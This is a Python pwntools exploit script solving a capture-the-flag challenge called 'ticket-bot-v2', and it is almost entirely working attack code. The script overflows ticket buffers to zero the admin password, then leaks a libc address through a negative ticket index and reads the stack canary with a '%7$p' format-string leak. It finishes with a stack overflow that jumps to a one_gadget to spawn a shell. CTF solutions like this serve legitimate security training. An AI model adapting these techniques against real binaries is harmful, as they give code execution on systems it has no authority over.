#!/usr/bin/env python3
import ctypes

from pwn import *

fname = f"chal_patched"
ip = "ticket-bot-v2.challs.csc.tf"
port = 1337

# set target binary and context
elf = context.binary = ELF(f"./{fname}")

# context.log_level = 'debug'

# set libc for Pwntools
libc = ELF("./libc.so.6")

gdbscript = """
b *main
b *0x0000555555555726
b *0x00005555555556d4
"""
# set follow-fork-mode child

if args.ATTACH:
    r = process(f"{fname}", aslr=False)
    attach(f"{fname}", gdbscript=gdbscript)
elif args.DEBUG:
    r = gdb.debug(f"./{fname}", aslr=False, gdbscript=gdbscript)
elif args.REMOTE:
    r = remote(ip, port)
else:
    r = process(f"{fname}", aslr=True)

rb = lambda x: r.recvb(x)
rl = lambda: r.recvline()
ru = lambda x: r.recvuntil(x)
s = lambda x: r.send(x)
sl = lambda x: r.sendline(x)
sla = lambda x, y: r.sendlineafter(x, y)
inter = lambda: r.interactive()

# this will import the libc rand() function that we can use it in ur python script

# libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')


def pwn():

    s("A" * 32)
    sl("1")
    s("B" * 32)
    sl("1")
    s("C" * 32)
    sl("1")
    s("D" * 32)
    sl("1")
    s("E" * 32)
    sl("1")

    payload = b""
    payload += p32(0x00)  # seed
    payload += p32(0x00)  # password
    payload += p32(0xFFFFFFFA)  # currentticketid
    sl(payload)

    print("Admin Password set to 0")

    sl("2")

    sl("-6")

    ru("please enter your ticketID\n")

    leak = unpack(rb(8)[:-1], "all")
    print(f"got __stack_chk_fail = {hex(leak)}")

    libc.address = leak - libc.symbols["__stack_chk_fail"]
    print(f"libc base = {hex(libc.address)}")

    sl("3")
    sl("0")
    sl("1")

    ru("Enter new Password\n")

    sl("%7$p")

    rl()
    canary = int(rl()[:18], 16)
    print(f"canary = {hex(canary)}")

    sl("3")
    sl("0")
    sl("1")

    one = libc.address + 0xE3B01

    payload = b"A" * 8
    payload += p64(canary)
    payload += b"B" * 8  # rbp
    payload += p64(one)

    sl(payload)

    inter()


if __name__ == "__main__":
    pwn()
